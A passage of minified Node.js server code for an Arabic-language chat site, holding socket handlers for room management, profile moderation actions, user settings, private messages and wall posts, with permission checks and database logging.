                this.store.rooms.insertToDB(e.room).then(t => {
                    e.room.id = t.insertId;
                    const s = this.store.rooms.add(e.room);
                    s && (this.publishAddedRoom(s), this.handler(r.enc({
                        error: !1
                    })), this.register(s.name, "add"))
                }).catch(e => {})
            } else {
                e.room.id = Date.now();
                const t = this.store.rooms.add(e.room);
                t && (this.publishAddedRoom(t), this.handler(r.enc({
                    error: !1
                })), this.register(t.name, "add"))
            }
        }
    }, o.prototype.editRoom = function(e) {
        if (e && e.room) {
            if (r.isXSS(e.room.name) || r.isXSS(e.room.description) || r.isXSS(e.room.welcome)) return;
            const t = this.store.rooms.all().filter(t => t.id == e.room.id)[0];
            if (!t) return;
            if (e.room.name != t.name && this.store.rooms.all().filter(t => t.name == e.room.name).length) return this.handler(r.enc({
                error: !0,
                message: "هذه الغرفة موجودة, الرجاء إختيار إسم آخر"
            }));
            if (!this.user.can("room_edit", this.handler)) return;
            if (e.room.capacity = isNaN(parseInt(e.room.capacity)) ? 40 : parseInt(e.room.capacity), e.room.removeWhenEmpty) {
                const t = this.store.rooms.edit(e.room);
                t && (this.store.io.emit("res", r.enc({
                    type: "ROOMS_UPDATED",
                    data: {
                        rooms: [t.parse()]
                    }
                })), this.handler(r.enc({
                    error: !1
                })), this.register(t.name, "edit"))
            } else this.store.rooms.save(e.room).then(t => {
                const s = this.store.rooms.edit(e.room);
                s && (this.store.io.emit("res", r.enc({
                    type: "ROOMS_UPDATED",
                    data: {
                        rooms: [s.parse()]
                    }
                })), this.handler(r.enc({
                    error: !1
                })), this.register(s.name, "edit"))
            }).catch(e => {})
        }
    }, o.prototype.removeRoom = function(e) {
        if (e && e.room.id) {
            const s = this.store.rooms.all().filter(t => t.id == e.room.id)[0];
            if (!s || s.removeWhenEmpty) return;
            if (s.default) return this.handler(r.enc({
                error: !0,
                message: "لا يمكن حذف هذه الغرفة"
            }));
            if (!this.user.can("room_remove", this.handler)) return;
            var t = this.store.rooms.remove(s.id);
            t && this.store.io.emit("res", r.enc({
                type: "ADMIN_ROOM_DELETED",
                data: {
                    ids: [t]
                }
            })), this.handler(r.enc({
                error: !1
            })), this.store.rooms.remvoeFromDB(s.id).catch(e => {}), this.register(s.name, "remove")
        }
    }, o.prototype.publishAddedRoom = function(e) {
        this.store.users.forEach(t => {
            t.socket.emit("res", r.enc({
                type: "NEW_ROOM_CREATED",
                data: {
                    room: e.parse(t, this.store.users)
                }
            }))
        })
    }, o.prototype.register = function(e, t) {
        const s = this;
        return new Promise((r, o) => {
            s.store.db.query("INSERT INTO roomsReg (byRealName, byNickName, roomName, actionType, created_at, updated_at) VALUES (?,?,?,?,?,?)", [s.user.name, s.user.getUsername(), e, t, new Date, new Date], (e, t) => {
                e && o(e), r(t)
            })
        })
    }, e.exports = o
}, function(e, t, s) {
    const r = s(0),
        o = s(9);

    function i(e, t, s, o) {
        switch (this.socket = t, this.user = s, this.store = o, this.handler = e.handler, r.check(o, t), e.type) {
            case "PROFILE_SHOW":
                return this.getProfile(e.data);
            case "PROFILE_ACTION_NOTIFY":
                return this.notify(e.data);
            case "PROFILE_ACTION_LIKE":
                return this.like(e.data);
            case "PROFILE_ACTION_GET_ALBUM":
                return this.getAlbum(e.data);
            case "PROFILE_REFRESH_ALBUM":
                return this.refreshAlbum(e.data);
            case "PROFILE_LIKE_ALBUM_PHOTO":
                return this.likeAlbumPhoto(e.data);
            case "PROFILE_REMOVE_ALBUM_PHOTO":
                return this.removeAlbumPhoto(e.data);
            case "PROFILE_ACTION_GIFT":
                return this.gift(e.data);
            case "PROFILE_ACTION_REMOVE_GIFT":
                return this.removeGift(e.data);
            case "PROFILE_ACTION_REMOVE_AVATAR":
                return this.removeAvatar(e.data);
            case "PROFILE_ACTION_REVEAL_NAMES":
                return this.revealNames(e.data);
            case "PROFILE_ACTION_CHANGE_DECORATION":
                return this.changeDecoration(e.data);
            case "PROFILE_ACTION_CONTROL_LIKES":
                return this.controlLikes(e.data);
            case "PROFILE_ACTION_ROOM_EXCPEL":
                return this.roomExcpel(e.data);
            case "PROFILE_ACTION_CANCEL_RADIO":
                return this.cancelRadio(e.data);
            case "PROFILE_ACTION_EXCPEL":
                return this.excpel(e.data);
            case "PROFILE_ACTION_BAN":
                return this.ban(e.data);
            case "PROFILE_ACTION_CHANGE_ROOM":
                return this.changeRoom(e.data);
            case "PROFILE_ACTION_CHANGE_ROLE":
                return this.changeRole(e.data);
            default:
                return null
        }
    }
    i.prototype.findUser = function(e) {
        let t = this.store.users.filter(t => t.id == e)[0];
        return t || this.store.usersReg.filter(t => t.id == e)[0]
    }, i.prototype.getProfile = function(e) {
        const t = this.findUser(e.id);
        if (t && t.canBeSeenBy(this.user)) {
            const e = this.store.roles.all(),
                s = t.likes.includes(this.user.ip);
            return this.handler(r.enc({
                user: t.parse("lg"),
                actions: this.user.actions(),
                roles: e,
                liked: s
            }))
        }
    }, i.prototype.notify = function(e) {
        const t = this.store.settings.get("required_likes_notify");
        if (this.user.getReputation() < t) return this.handler(r.enc("يجب أن تتوفر على " + t + " إعجاب حتى تتمكن من القيام بهذه العملية"));
        if (this.store.wordsFilter.check(e.message, this.user, this.handler)) return;
        if (!this.user.can("orders_notify", this.handler)) return;
        const s = this.findUser(e.id);
        if (s) {
            if (s.isNotificationsDisabled && !this.user.isGreaterThan(s)) return this.handler(r.enc("لا يمكنك تنبيه هذا الشخص"));
            const t = {
                user: this.user.parse(),
                message: e.message
            };
            s.socket.emit("res", r.enc({
                type: "PROFILE_ACTION_NOTIFY",
                data: t
            })), this.store.ordersReg.notify(this.user, s, e.message), this.store.db.query("INSERT INTO notificationsReg (byRealName, byNickName, toRealName, toNickName, msg, created_at, updated_at) VALUES (?,?,?,?,?,?,?)", [this.user.name, this.user.getUsername(), s.name, s.getUsername(), e.message, new Date, new Date], (e, t) => {
                e && console.log(e)
            })
        }
    }, i.prototype.like = function(e) {
        const t = this.findUser(e.id);
        if (t && t.like(this.user.ip)) {
            const e = {
                user: this.user.parse()
            };
            t.socket.emit("res", r.enc({
                type: "PROFILE_ACTION_LIKE",
                data: e
            })), this.handler(r.enc(!0))
        }
    }, i.prototype.getAlbum = function(e) {
        const t = this.findUser(e.id);
        if (t) {
            if (t.isGuest()) return this.handler(r.enc("الزوار ليس لديهم صلاحية الألبوم"));
            var o = {
                id: t.id,
                name: t.getUsername(),
                avatar: t.getAvatar(),
                me: t.id == this.user.id
            };
            o.me ? s(22).randomBytes(16, (e, s) => {
                var i = s.toString("hex");
                this.user.updateAjaxToken(i).then(e => {
                    o.token = i, this.handler(r.enc({
                        photos: t.getAlbum().getPhotos(),
                        user: o
                    }))
                }).catch(e => {
                    console.log(e)
                })
            }) : this.handler(r.enc({
                photos: t.getAlbum().getPhotos(),
                user: o
            }))
        }
    }, i.prototype.refreshAlbum = function(e) {
        this.user.album && this.user.album.count() ? this.user.getAlbum().initPhotos() : this.user.album = new o(this.store.db, this.user.reg_id)
    }, i.prototype.likeAlbumPhoto = function(e) {
        if (e && e.user_id && e.photo_id) {
            const t = this.findUser(e.user_id);
            if (t) {
                if (!t.getAlbum().isValidPhoto(e.photo_id)) return;
                this.user.isGuest() ? this.user.photoLikes.includes(e.photo_id) || t.getAlbum().guestLikePhoto(e.photo_id).then(s => {
                    this.user.photoLikes.push(e.photo_id), this.user.id != t.id && t.socket.emit("res", r.enc({
                        type: "PROFILE_LIKE_ALBUM_PHOTO",
                        data: {
                            photo: s,
                            user: this.user.parse()
                        }
                    })), this.handler(r.enc(!0))
                }).catch(e => {}) : t.getAlbum().likePhoto(e.photo_id, this.user.reg_id).then(e => {
                    this.user.id != t.id && t.socket.emit("res", r.enc({
                        type: "PROFILE_LIKE_ALBUM_PHOTO",
                        data: {
                            photo: e,
                            user: this.user.parse()
                        }
                    })), this.handler(r.enc(!0))
                }).catch(e => {})
            }
        }
    }, i.prototype.removeAlbumPhoto = function(e) {
        e && "number" == typeof e.id && this.user.getAlbum().removePhotoById(e.id).then(e => {
            this.handler(r.enc(e))
        }).catch(e => {})
    }, i.prototype.gift = function(e) {
        const t = this.findUser(e.userID);
        if (t) {
            if (!this.user.isGreaterThan(t)) return this.handler(r.enc("لا يمكنك القيام بهذه العملية"));
            if (!this.user.can("orders_gift", this.handler)) return;
            const s = this.store.gifts.all().filter(t => t.id == e.giftID)[0];
            if (s && t.gift != s.icon) {
                t.gift = s.icon;
                const e = {
                    user: this.user.parse(),
                    message: s.icon
                };
                t.socket.emit("res", r.enc({
                    type: "PROFILE_ACTION_GIFT",
                    data: e
                })), this.store.io.emit("res", r.enc({
                    type: "USER_UPDATED",
                    data: {
                        id: t.id,
                        reg_id: t.reg_id,
                        updates: {
                            icon: t.getIcon()
                        }
                    }
                })), t.saveAttr("gift"), this.store.ordersReg.gift(this.user, t)
            }
        }
    }, i.prototype.removeGift = function(e) {
        const t = this.findUser(e.userID);
        if (t && t.gift) {
            if (!this.user.isGreaterThan(t)) return this.handler(r.enc("لا يمكنك القيام بهذه العملية"));
            if (!this.user.can("orders_gift", this.handler)) return;
            const e = t.gift;
            t.gift = null;
            const s = {
                user: this.user.parse(),
                message: e
            };
            t.socket.emit("res", r.enc({
                type: "PROFILE_ACTION_REMOVE_GIFT",
                data: s
            })), this.store.io.emit("res", r.enc({
                type: "USER_UPDATED",
                data: {
                    id: t.id,
                    reg_id: t.reg_id,
                    updates: {
                        icon: t.getIcon()
                    }
                }
            })), t.saveAttr("gift"), this.store.ordersReg.removeGift(this.user, t, e)
        }
    }, i.prototype.removeAvatar = function(e) {
        const t = this.findUser(e.id);
        if (t && t.avatar) {
            if (!this.user.isGreaterThan(t)) return this.handler(r.enc("لا يمكنك القيام بهذه العملية"));
            if (!this.user.can("orders_remove_avatar", this.handler)) return;
            t.removeAvatar();
            const e = {
                avatar: t.getAvatar()
            };
            this.store.io.emit("res", r.enc({
                type: "USER_UPDATED",
                data: {
                    id: t.id,
                    reg_id: t.reg_id,
                    updates: e
                }
            })), this.handler(r.enc({
                id: t.id,
                updates: e
            })), t.saveAttr("avatar"), this.store.ordersReg.removeAvatar(this.user, t)
        }
    }, i.prototype.revealNames = function(e) {
        const t = this.findUser(e.id);
        if (t) {
            if (!this.user.isGreaterThan(t)) return this.handler(r.enc("لا يمكنك القيام بهذه العملية"));
            if (!this.user.can("reveal_names", this.handler)) return;
            this.store.revealNames.get(t).then(e => {
                this.handler(r.enc(e))
            }).catch(e => {
                console.log("ProfileHandler.revealNames.error", e)
            })
        }
    }, i.prototype.changeDecoration = function(e) {
        const t = this.findUser(e.id);
        if (t && e.decoration && e.decoration != t.getUsername()) {
            if (!this.user.isGreaterThan(t)) return this.handler(r.enc("لا يمكنك القيام بهذه العملية"));
            if (this.store.wordsFilter.check(e.decoration, this.user, this.handler)) return;
            if (!this.user.can("orders_change_decoartion", this.handler)) return;
            t.decoration = r.sanitize(e.decoration);
            const s = {
                name: t.getUsername()
            };
            this.store.io.emit("res", r.enc({
                type: "USER_UPDATED",
                data: {
                    id: t.id,
                    reg_id: t.reg_id,
                    updates: s
                }
            })), this.handler(r.enc({
                id: t.id,
                updates: s
            })), t.socket.emit("res", r.enc({
                type: "PROFILE_ACTION_CHANGE_DECORATION",
                data: {
                    user: this.user.parse()
                }
            })), t.saveAttr("decoration"), this.store.ordersReg.changeName(this.user, t)
        }
    }, i.prototype.controlLikes = function(e) {
        const t = this.findUser(e.id);
        if (t && e.likes && e.likes != t.getReputation()) {
            if (!this.user.isGreaterThan(t) && t.id != this.user.id) return this.handler(r.enc("لا يمكنك القيام بهذه العملية"));
            if (!this.user.can("like_controls", this.handler)) return;
            if (!isNaN(parseInt(e.likes))) {
                t.reputation = parseInt(e.likes) - t.likes.length;
                const s = t.getReputation(),
                    o = {
                        likes: s
                    };
                this.store.io.emit("res", r.enc({
                    type: "USER_UPDATED",
                    data: {
                        id: t.id,
                        reg_id: t.reg_id,
                        updates: o
                    }
                })), this.handler(r.enc({
                    id: t.id,
                    updates: o
                })), t.socket.emit("res", r.enc({
                    type: "PROFILE_ACTION_CONTROL_LIKES",
                    data: {
                        user: this.user.parse(),
                        likes: s
                    }
                })), t.saveAttr("reputation", s)
            }
        }
    }, i.prototype.roomExcpel = function(e) {
        const t = this.findUser(e.id);
        if (t && t.room) {
            if (!this.user.isGreaterThan(t)) return this.handler(r.enc("لا يمكنك القيام بهذه العملية"));
            if (!this.user.can("orders_excpel_from_room", this.handler)) return;
            t.reputation = parseInt(e.likes) - t.likes.length;
            const s = t.room;
            t.excpelFromRoom(t.room.id);
            const o = {
                room: null
            };
            this.store.io.emit("res", r.enc({
                type: "USER_EXPELED_FROM_ROOM",
                data: {
                    user: t.parse(),
                    oldRoom: s
                }
            })), this.store.io.emit("res", r.enc({
                type: "USER_UPDATED",
                data: {
                    id: t.id,
                    reg_id: t.reg_id,
                    updates: o
                }
            })), t.socket.emit("res", r.enc({
                type: "PROFILE_ACTION_ROOM_EXCPEL",
                data: {
                    user: this.user.parse(),
                    oldRoom: s
                }
            })), this.handler(r.enc({
                id: t.id,
                updates: o
            })), this.store.ordersReg.roomExcpel(this.user, t, s)
        }
    }, i.prototype.cancelRadio = function(e) {
        const t = this.findUser(e.id);
        if (t) {
            if (!this.user.isGreaterThan(t)) return this.handler(r.enc("لا يمكنك القيام بهذه العملية"));
            if (!this.user.can("stop_radio", this.handler, !0)) return;
            this.store.radio.getSpeaker() && this.store.radio.getSpeaker().id == e.id && (this.store.radio.stopSpeaking(this.store.radio.getSpeaker()), this.handler(r.enc(!0)))
        }
    }, i.prototype.excpel = function(e) {
        const t = this.findUser(e.id);
        if (t) {
            if (!this.user.isGreaterThan(t)) return this.handler(r.enc("لا يمكنك القيام بهذه العملية"));
            if (!this.user.can("orders_excpel", this.handler)) return;
            this.store.ordersReg.excpel(this.user, t), t.socket.emit("expl"), t.excpel(this.user.parse())
        }
    }, i.prototype.ban = function(e) {
        const t = this.findUser(e.id);
        if (t) {
            if (!this.user.isGreaterThan(t)) return this.handler(r.enc("لا يمكنك القيام بهذه العملية"));
            if (!this.user.can("orders_ban", this.handler)) return;
            t.ban(this.user).then(() => {
                this.store.ordersReg.ban(this.user, t), t.logout()
            }).catch(e => {
                this.store.ordersReg.ban(this.user, t), t.logout()
            })
        }
    }, i.prototype.leaveRoom = function(e) {
        e.room && (e.room.users = e.room.users.filter(t => e.id != t)), e.room = null
    }, i.prototype.changeRoom = function(e) {
        const t = this.findUser(e.id),
            s = this.store.rooms.all().filter(t => t.id == e.roomId)[0];
        if (t && s) {
            if (!this.user.isGreaterThan(t)) return this.handler(r.enc("لا يمكنك القيام بهذه العملية"));
            if (!this.user.can("orders_change_room", this.handler)) return;
            const e = {
                    error: !0,
                    message: null
                },
                o = t.room;
            this.leaveRoom(t), s.users.push(this.user.id), t.room = s, this.store.users.forEach(e => {
                e.socket.emit("res", r.enc({
                    type: "USER_JOINDED_ROOM",
                    data: {
                        user: t.parse(),
                        oldRoom: o ? o.parse(e, this.store.users) : null,
                        newRoom: s.parse(e, this.store.users)
                    }
                }))
            }), e.error = !1, e.user = this.user.parse(), e.room = s.parse(t, this.store.users), t.socket.emit("res", r.enc({
                type: "PROFILE_ACTION_CHANGE_ROOM",
                data: e
            })), this.store.users.forEach(e => {
                this.store.io.emit("res", r.enc({
                    type: "USER_UPDATED",
                    data: {
                        id: t.id,
                        reg_id: t.reg_id,
                        updates: {
                            room: t.room.parse(e, this.store.users)
                        }
                    }
                }))
            }), this.store.ordersReg.orderChangeRoom(this.user, t)
        }
    }, i.prototype.changeRole = function(e) {
        const t = this.findUser(e.id);
        if (t) {
            if (!this.user.isGreaterThan(t)) return this.handler(r.enc("يمكنك فقط ترقية السوابر الأقل منك رتبة"));
            if (!this.user.can("orders_upgrade", this.handler)) return;
            if (!this.user.canUpgrade(t, e.roleId)) return this.handler(r.enc("لا تملك الصلاحيات للترقية إلى هذه الرتبة"));
            t.role = e.roleId;
            const s = this.store.roles.getRoleName(t.role),
                o = {
                    user: this.user.parse(),
                    roleName: s
                };
            t.socket.emit("res", r.enc({
                type: "PROFILE_ACTION_CHANGE_ROLE",
                data: o
            })), this.store.io.emit("res", r.enc({
                type: "USER_UPDATED",
                data: {
                    id: t.id,
                    reg_id: t.reg_id,
                    updates: {
                        role: t.role,
                        power: t.getPower(),
                        icon: t.getIcon()
                    }
                }
            })), t.saveAttr("role_id", t.role), this.store.ordersReg.changeRole(this.user, t, s)
        }
    }, e.exports = i
}, function(e, t) {
    e.exports = require("crypto")
}, function(e, t, s) {
    const r = s(0),
        o = (s(2), s(6), s(4));

    function i(e, t, s, o) {
        switch (this.socket = t, this.user = s, this.store = o, this.handler = e.handler, r.check(o, t), e.type) {
            case "USER_SETTINGS_SAVE":
                return this.save(e.data);
            case "USER_SETTINGS_SET_FONT_SIZE":
                return this.setFontSize(e.data);
            case "USER_SETTINGS_REMOVE_NAME_BG_COLOR":
                return this.removeNamgeBgColor();
            case "USER_SETTINGS_HIDE_ROLE_ICON":
                return this.hideRoleIcon();
            case "USER_SETTINGS_CHANGE_AVATAR":
                return this.changeAvatar(e.data);
            case "USER_SETTINGS_REMOVE_AVATAR":
                return this.removeAvatar();
            case "USER_SETTINGS_TOGGLE_PRIVATE":
                return this.togglePrivate();
            case "USER_SETTINGS_TOGGLE_NOTIFICATIONS":
                return this.toggleNotifications();
            case "USER_SETTINGS_CHANGE_PASSWORD":
                return this.changePassword(e.data);
            case "USER_SETTINGS_SEND_AD":
                return this.sendAd(e.data);
            default:
                return null
        }
    }
    i.prototype.save = function(e) {
        if (this.store.wordsFilter.check(e.status, this.user, this.handler, "هذه الحالة تحتوي على كلمات ممنوعة, يرجى عدم تكرارها حتى لا يتم حظرك")) return;
        this.user.fontColor = e.fontColor = r.validateColor(e.fontColor, "#000000"), this.user.statusColor = e.statusColor = r.validateColor(e.statusColor, "#555555"), this.user.nameColor = e.nameColor = r.validateColor(e.nameColor, "#000000"), this.user.nameBgColor = e.nameBgColor = r.validateColor(e.nameBgColor, "#FFFFFF00"), this.user.decoration = e.decoration = r.sanitize(e.decoration), this.user.status = e.status = r.sanitize(e.status, this.store.shortcuts);
        const t = {
            fontColor: this.user.fontColor,
            statusColor: this.user.statusColor,
            nameColor: this.user.nameColor,
            nameBgColor: this.user.nameBgColor,
            status: this.user.getStatus(),
            name: this.user.getUsername()
        };
        this.handler(r.enc(t)), this.store.io.emit("res", r.enc({
            type: "USER_UPDATED",
            data: {
                id: this.user.id,
                reg_id: this.user.reg_id,
                updates: t
            }
        })), this.user.save()
    }, i.prototype.setFontSize = function(e) {
        this.user.setFontSize(e.fontSize), this.handler(r.enc(this.user.fontSize)), this.user.saveAttr("fontSize")
    }, i.prototype.removeNamgeBgColor = function() {
        this.user.nameBgColor = "#FFFFFF00", this.handler(r.enc(this.user.nameBgColor)), this.user.saveAttr("nameBgColor")
    }, i.prototype.hideRoleIcon = function() {
        this.user.isRoleIconHidden = !this.user.isRoleIconHidden, this.store.io.emit("res", r.enc({
            type: "USER_UPDATED",
            data: {
                id: this.user.id,
                reg_id: this.user.reg_id,
                updates: {
                    icon: this.user.getIcon()
                }
            }
        })), this.handler(r.enc(this.user.isRoleIconHidden)), this.user.saveAttr("isRoleIconHidden")
    }, i.prototype.changeAvatar = function(e) {
        if (r.isXSS(e.avatar)) return this.handler(r.enc(this.user.avatar));
        this.user.avatar && this.user.removeAvatar(), this.user.avatar = e.avatar;
        const t = {
            avatar: this.user.getAvatar()
        };
        this.store.io.emit("res", r.enc({
            type: "USER_UPDATED",
            data: {
                id: this.user.id,
                reg_id: this.user.reg_id,
                updates: t
            }
        })), this.handler(r.enc(this.user.avatar)), this.user.saveAttr("avatar")
    }, i.prototype.removeAvatar = function() {
        if (this.user.avatar) {
            this.user.removeAvatar();
            const e = this.user.getAvatar(),
                t = {
                    avatar: e
                };
            this.store.io.emit("res", r.enc({
                type: "USER_UPDATED",
                data: {
                    id: this.user.id,
                    reg_id: this.user.reg_id,
                    updates: t
                }
            })), this.handler(r.enc(e)), this.user.saveAttr("avatar")
        }
    }, i.prototype.togglePrivate = function() {
        this.user.isPrivateDisabled = !this.user.isPrivateDisabled, this.handler(r.enc(this.user.isPrivateDisabled)), this.user.saveAttr("isPrivateDisabled"), this.user.isPrivateDisabled ? this.user.setState(this.user.stateEnum.NO_PRIVATE) : this.user.setState(this.user.stateEnum.ACTIVE), this.store.io.emit("res", r.enc({
            type: "USER_UPDATED",
            data: {
                id: this.user.id,
                reg_id: this.user.reg_id,
                updates: {
                    state: this.user.getState()
                }
            }
        }))
    }, i.prototype.toggleNotifications = function() {
        this.user.isNotificationsDisabled = !this.user.isNotificationsDisabled, this.handler(r.enc(this.user.isNotificationsDisabled)), this.user.saveAttr("isNotificationsDisabled")
    }, i.prototype.changePassword = function(e) {
        if (this.user.reg_id) {
            const t = {
                error: !0,
                message: "حدث خطأ أثناء القيام بالعملية"
            };
            if ("string" != typeof e.password) return this.handler(r.enc(t));
            if (e.password.length < 6) return t.message = "كلمة المرور لا يجب أن تقل عن 6 أحرف", this.handler(r.enc(t));
            const s = {
                password: e.password,
                user_id: this.user.reg_id,
                adminHash: this.store.config.adminHash
            };
            o.post(this.store.config.host + "auth/change-password", s).then(e => (t.error = !1, t.message = "تمت العملية بنجاح", this.handler(r.enc(t)))).catch(e => this.handler(r.enc(t)))
        }
    }, i.prototype.sendAd = function(e) {
        if ("string" != typeof e.message || r.isXSS(e.message)) return;
        if (this.store.wordsFilter.check(e.message, this.user, this.handler)) return;
        if (!this.user.can("send_ad", this.handler)) return;
        const t = r.sanitize(e.message, this.store.shortcuts),
            s = {
                type: "NEW_AD",
                data: {
                    time: Date.now(),
                    user: this.user.parse(),
                    message: t
                }
            };
        this.store.io.emit("res", r.enc(s)), this.store.db.query("INSERT INTO adsReg (byRealName, byNickName, msg, created_at, updated_at) VALUES (?,?,?,?,?)", [this.user.name, this.user.getUsername(), t, new Date, new Date], (e, t) => {
            e && console.log(e)
        })
    }, e.exports = i
}, function(e, t, s) {
    const r = s(0),
        o = s(3);
    s(4);

    function i(e, t, s, o) {
        switch (this.socket = t, this.user = s, this.store = o, this.handler = e.handler, r.check(o, t), e.type) {
            case "NEW_PRIVATE_MESSAGE":
                return this.onNewMessage(e.data);
            case "BEFORE_SEND_MEDIA":
                return this.onBeforeSendMedia(e.data);
            default:
                return null
        }
    }
    i.prototype.onBeforeSendMedia = function(e) {
        if (!this.canSendPrivateMessages()) return;
        const t = this.findUser(e.id);
        if (t) {
            if (!this.canOpenDisabledPrivate(t)) return;
            this.handler(r.enc(!0))
        }
    }, i.prototype.onNewMessage = function(e) {
        if (this.store.settings.get("disable_private_messages")) return this.handler(r.enc("تم إغلاق الخاص بشكل مؤقت"));
        if (this.user.isGuest() && this.store.settings.get("disable_guest_private_messages")) return this.handler(r.enc("الرجاء تسجيل عضوية حتى تتمكن من إستعمال الخاص"));
        if (!this.canSendPrivateMessages()) return;
        if (!this.isValidType(e.type)) return;
        if (!e.message || r.isXSS(e.message)) return;
        if (this.store.wordsFilter.check(e.message, this.user, this.handler)) return;
        const t = this.findUser(e.id);
        if (t) {
            if (!this.canOpenDisabledPrivate(t)) return;
            if ("text" == e.type) {
                const t = r.getYoutubeId(e.message);
                t && (e.type = "youtube", e.message = t)
            }
            const s = {
                    id: o(),
                    body: r.sanitize(e.message, this.store.shortcuts, this.store.settings.get("private_msg_length")),
                    type: e.type,
                    time: Date.now(),
                    by: this.user.id
                },
                i = {
                    type: "NEW_PRIVATE_MESSAGE",
                    data: {
                        from: this.user.parse(),
                        message: s
                    }
                };
            t.socket.emit("res", r.enc(i)), this.handler(r.enc(s)), this.user.lastMessage = {
                time: Date.now(),
                isPublic: !1,
                isPrivate: !0,
                msg: e.message
            }, this.user.privateUsers.includes(t.id) || this.user.privateUsers.push(t.id), this.register(t, e.message, e.type).catch(e => {})
        }
    }, i.prototype.canSendPrivateMessages = function() {
        const e = this.store.settings.get("required_likes_private");
        return !(this.user.getReputation() < e) || (this.handler(r.enc("يجب أن تتوفر على " + e + " إعجاب حتى تتمكن من القيام بهذه العملية")), !1)
    }, i.prototype.canOpenDisabledPrivate = function(e) {
        return !(e.isPrivateDisabled && !e.privateUsers.includes(this.user.id)) || (this.user.has("open_private") && !!this.user.isGreaterThanOrEqual(e) || (this.handler(r.enc("الخاص مغلق")), !1))
    }, i.prototype.findUser = function(e) {
        return this.store.users.filter(t => t.id == e)[0]
    }, i.prototype.isValidType = function(e) {
        return ["text", "photo", "sound", "video", "youtube"].includes(e)
    }, i.prototype.register = function(e, t, s) {
        const r = this;
        return new Promise((o, i) => {
            r.store.db.query("INSERT INTO private_messages (byRealName, byNickName, toRealName, toNickName, msg, msgType, created_at, updated_at) VALUES (?,?,?,?,?,?,?,?)", [r.user.name, r.user.getUsername(), e.name, e.getUsername(), t, s, new Date, new Date], (e, t) => {
                e && i(e), o(t)
            })
        })
    }, e.exports = i
}, function(e, t, s) {
    const r = s(0);

    function o(e, t, s, o) {
        switch (this.socket = t, this.user = s, this.store = o, this.handler = e.handler, r.check(o, t), e.type) {
            case "WALL_GET_POSTS":
                return this.getPosts(e.data);
            case "WALL_GET_POST_COMMENTS":
                return this.getPostComments(e.data);
            case "WALL_BEFORE_SEND_MEDIA":
                return this.onBeforeSendMedia(e.data);
            case "WALL_ADD_POST":
                return this.add(e.data);
            case "WALL_LIKE_POST":
                return this.like(e.data);
            case "WALL_REMOVE_POST":
                return this.remove(e.data);
            case "ADD_WALL_POST_COMMENT":
                return this.addComment(e.data);
            case "WALL_POST_COMMENT_LIKE":
                return this.likeComment(e.data);
            case "WALL_POST_COMMENT_REMOVE":
                return this.removeComment(e.data);
            default:
                return null
        }
    }
    o.prototype.getPosts = function(e) {
        this.store.wall.all(this.store.settings.get("wall_msg_count")).then(e => {
            this.handler(r.enc(e))
        }).catch(e => {})
    }, o.prototype.getPostComments = function(e) {
        this.store.wall.getPostComments(e.post_id, 100).then(e => {
            this.handler(r.enc(e))
        }).catch(e => {})
    }, o.prototype.onBeforeSendMedia = function(e) {
        const t = this.store.settings.get("required_likes_wall");
        if (this.user.getReputation() < t) return this.handler(r.enc("يجب أن تتوفر على " + t + " إعجاب حتى تتمكن من القيام بهذه العملية"));
        this.user.can("wall_interval", this.handler, !0) && this.user.generateUploadHash().then(e => {
            this.handler(r.enc({
                error: !1,
                user_id: this.user.reg_id,
                hash: e
            }))
        }).catch(e => {})
    }, o.prototype.add = function(e) {
        const t = this.store.settings.get("required_likes_wall");
        if (this.user.getReputation() < t) return this.handler(r.enc("يجب أن تتوفر على " + t + " إعجاب حتى تتمكن من القيام بهذه العملية"));
        if (this.isValidType(e.type) && e.body && !r.isXSS(e.body) && !this.store.wordsFilter.check(e.body, this.user, this.handler) && this.user.can("wall_interval", this.handler)) {
            if ("text" == e.type) {
                const t = r.getYoutubeId(e.body);
                t && (e.type = "youtube", e.body = t)
            }
            this.store.wall.add(e, this.user.reg_id).then(e => {
                e.user = this.user.parse(), this.store.io.emit("res", r.enc({
                    type: "POST_ADDED",
                    data: e
                })), this.handler(r.enc({
                    error: !1
                })), this.register(e, "add")
            }).catch(e => {})
        }
    }, o.prototype.addComment = function(e) {
        if (this.user.isGuest()) return this.handler(r.enc("يجب أن تتوفر على عضوية حتى تتمكن من التعليق على المنشورات"));
        const t = this.store.settings.get("required_likes_wall");
        if (this.user.getReputation() < t) return this.handler(r.enc("يجب أن تتوفر على " + t + " إعجاب حتى تتمكن من القيام بهذه العملية"));
        if (!e.text || r.isXSS(e.text)) return;
        if (this.store.wordsFilter.check(e.text, this.user, this.handler)) return;
        let s = e.post_id;
        this.store.wall.addComment(e, this.user.reg_id).then(e => {
            e.user = this.user.parse(), this.store.io.emit("res", r.enc({
                type: "POST_COMMENT_ADDED",
                data: {
                    post_id: s
                }
            })), this.handler(r.enc({
                error: !1,
                comment: e
            }));
            const t = this.store.users.filter(t => t.reg_id == e.postOwnerId)[0];
            if (t && t.socket && t.id != this.user.id) {
                const s = {
                    user: this.user.parse(),
                    commentId: e.id,
                    comment: e.comment,
                    postId: e.postId
                };
                t.socket.emit("res", r.enc({
                    type: "POST_COMMENTED",
                    data: s
                }))
            }
        }).catch(e => {})
    }, o.prototype.likeComment = function(e) {
        const t = parseInt(e.id);
        isNaN(t) || this.user.likedPostComments.includes(t) || this.store.wall.likeComment(t).then(e => {
            this.user.likedPostComments.push(t);
            const s = this.store.users.filter(t => t.reg_id == e.userId)[0];
            if (s && s.socket && s.id != this.user.id) {
                const o = {
                    user: this.user.parse(),
                    commentId: t,
                    comment: e.comment
                };
                s.socket.emit("res", r.enc({
                    type: "POST_COMMENT_LIKED",
                    data: o
                }))
            }
            this.handler(r.enc({
                error: !1
            }))
        }).catch(e => {})
    }, o.prototype.like = function(e) {
        const t = parseInt(e.id);
        isNaN(t) || this.user.likedPosts.includes(t) || this.store.wall.like(t).then(e => {
            this.user.likedPosts.push(t), this.store.io.emit("res", r.enc({
                type: "POST_UPDATED",
                data: {
                    id: t,
                    updates: {
                        likes: e.likes
                    }
                }
            }));
            const s = this.store.users.filter(t => t.reg_id == e.userId)[0];
            if (s && s.socket) {
                const e = {
                    user: this.user.parse(),
                    postId: t
                };
                s.socket.emit("res", r.enc({
                    type: "POST_LIKED",
                    data: e
                }))
            }
        }).catch(e => {})
    }, o.prototype.remove = function(e) {
        const t = parseInt(e.id);
        isNaN(t) || this.user.can("wall_remove", this.handler) && this.store.wall.remove(t).then(e => {
            this.store.io.emit("res", r.enc({
                type: "POST_REMOVED",
                data: {
                    id: t
                }
            }));
            const s = this.store.users.filter(t => t.reg_id == e.userId)[0];
            if (s && s.socket) {
                const e = {
                    user: this.user.parse(),
                    postId: t
                };
                s.socket.emit("res", r.enc({
